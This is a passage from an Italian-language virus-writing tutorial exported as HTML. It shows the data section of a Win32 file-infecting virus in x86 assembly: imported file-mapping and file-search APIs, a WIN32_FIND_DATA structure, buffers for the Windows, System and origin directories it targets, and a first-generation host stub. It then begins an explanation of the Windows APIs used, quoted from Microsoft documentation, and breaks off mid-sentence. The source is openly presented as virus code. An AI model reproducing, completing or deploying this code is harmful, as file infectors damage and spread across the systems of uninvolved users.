normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>NameTableVA<span style="mso-spacerun:
yes">             </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>OrdinalTableVA<span style="mso-spacerun:
yes">          </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@@Offsetz<span style="mso-spacerun:
yes">               </span>label<span style="mso-spacerun: yes">   </span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_FindFirstFileA<span style="mso-spacerun:
yes">         </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_FindNextFileA<span style="mso-spacerun:
yes">          </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_FindClose<span style="mso-spacerun:
yes">              </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_CreateFileA<span style="mso-spacerun:
yes">            </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_SetFilePointer<span style="mso-spacerun:
yes">         </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_SetFileAttributesA<span style="mso-spacerun:
yes">     </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_CloseHandle<span style="mso-spacerun:
yes">            </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_GetCurrentDirectoryA<span style="mso-spacerun:
yes">   </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_SetCurrentDirectoryA<span style="mso-spacerun:
yes">   </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_GetWindowsDirectoryA<span style="mso-spacerun:
yes">   </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_GetSystemDirectoryA<span style="mso-spacerun:
yes">    </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_CreateFileMappingA<span style="mso-spacerun:
yes">     </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_MapViewOfFile<span style="mso-spacerun:
yes">          </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_UnmapViewOfFile<span style="mso-spacerun:
yes">        </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>_SetEndOfFile<span style="mso-spacerun:
yes">           </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>MAX_PATH<span style="mso-spacerun:
yes">                </span>equ<span style="mso-spacerun: yes">     </span>260<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>FILETIME<span style="mso-spacerun:
yes">                </span>STRUC<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>FT_dwLowDateTime<span style="mso-spacerun:
yes">        </span>dd<span style="mso-spacerun: yes">      </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>FT_dwHighDateTime<span style="mso-spacerun:
yes">       </span>dd<span style="mso-spacerun: yes">  </span><span
style="mso-spacerun: yes">    </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>FILETIME<span style="mso-spacerun:
yes">                </span>ENDS<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WIN32_FIND_DATA<span style="mso-spacerun:
yes">         </span>label<span style="mso-spacerun: yes">   </span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_dwFileAttributes<span style="mso-spacerun:
yes">    </span>dd<span style="mso-spacerun: yes">      </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_ftCreationTime<span style="mso-spacerun:
yes">      </span>FILETIME ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>WFD_ftLastAccessTime<span
style="mso-spacerun: yes">    </span>FILETIME ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_ftLastWriteTime<span style="mso-spacerun:
yes">     </span>FILETIME ?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_nFileSizeHigh<span style="mso-spacerun:
yes">       </span>dd<span style="mso-spacerun: yes">      </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_nFileSizeLow<span style="mso-spacerun:
yes">        </span>dd<span style="mso-spacerun: yes">      </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_dwReserved0<span style="mso-spacerun:
yes">         </span>dd<span style="mso-spacerun: yes">      </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_dwReserved1<span style="mso-spacerun:
yes">         </span>dd<span style="mso-spacerun: yes">      </span>?<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_szFileName<span style="mso-spacerun:
yes">          </span>db<span style="mso-spacerun: yes">      </span>MAX_PATH
dup (?)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WFD_szAlternateFileName db<span style="mso-spacerun:
yes">      </span>13 dup (?)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                        </span>db<span style="mso-spacerun: yes">     
</span>03 dup (?)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>directories<span style="mso-spacerun:
yes">             </span>label<span style="mso-spacerun: yes">   </span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>WindowsDir<span style="mso-spacerun:
yes">              </span>db<span style="mso-spacerun: yes">      </span>7Fh
dup (00h)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>SystemDir<span style="mso-spacerun: yes">              
</span>db<span style="mso-spacerun: yes">      </span>7Fh dup (00h)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>OriginDir<span style="mso-spacerun:
yes">               </span>db<span style="mso-spacerun: yes">      </span>7Fh
dup (00h)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>dirs2inf<span style="mso-spacerun:
yes">                </span>equ<span style="mso-spacerun: yes">    
</span>(($-directories)/7Fh)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>mirrormirror<span style="mso-spacerun:
yes">            </span>db<span style="mso-spacerun: yes">      </span>dirs2inf<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>heap_end<span style="mso-spacerun:
yes">                </span>label<span style="mso-spacerun: yes">   </span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; questi sono i
dati utilizati dal virus.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>; HOST Prima
generazione<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>fakehost:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>pop<span style="mso-spacerun: yes">     </span>dword
ptr fs:[0]<span style="mso-spacerun: yes">                </span>; pulisce
stack<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>add<span style="mso-spacerun: yes">     </span>esp,4<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>popad<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>popfd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xor<span style="mso-spacerun: yes">     </span>eax,eax<span
style="mso-spacerun: yes">                         </span>; messaggio<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">       </span></span></b><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>push<span
style="mso-spacerun: yes">    </span>eax<span style="mso-spacerun:
yes">                             </span>; di prima generazione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">    </span>offset
szTitle<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>offset szMessage<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>MessageBoxA<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>push<span style="mso-spacerun: yes">    </span>00h<span
style="mso-spacerun: yes">                             </span>; fine prima
generazione<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>call<span style="mso-spacerun: yes">   
</span>ExitProcess<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>end<span style="mso-spacerun: yes">     </span>aztec<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>2. API utilizzate
nel codice<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'>le descrizioni
sono state prese pari pari dall’help API ufficiale della Microsoft.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun: yes">                                </span><span
style="mso-spacerun: yes">                                       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>The GetWindowsDirectory function retrieves the path of the Windows dir.
The Windows directory contains such files as Windows-based applications,<span
style="mso-spacerun: yes">  </span>initialization files, and Help files.<span
style="mso-spacerun: yes">                              </span><span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>UINT GetWindowsDirectory(<span style="mso-spacerun:
yes">                                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPTSTR lpBuffer,<span style="mso-spacerun: yes">    </span>// address of
buffer for Windows directory<span style="mso-spacerun: yes">          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>UINT uSize<span style="mso-spacerun: yes">  </span>// size of directory
buffer<span style="mso-spacerun: yes">                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun: yes">                       </span><span
style="mso-spacerun: yes">                                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpBuffer: Points to the buffer to receive the null-terminated string
containing the path. This path does not end with a backslash unless da<span
